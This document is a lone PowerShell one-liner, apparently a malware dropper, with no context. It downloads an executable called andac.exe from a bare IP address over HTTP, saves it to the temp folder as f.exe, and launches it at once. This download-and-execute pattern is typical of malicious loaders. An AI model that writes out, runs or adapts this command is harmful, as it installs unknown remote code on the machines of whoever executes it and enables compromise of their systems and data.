
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://201.130.72.171/andac.exe', $dpl);Start-Process $dpl

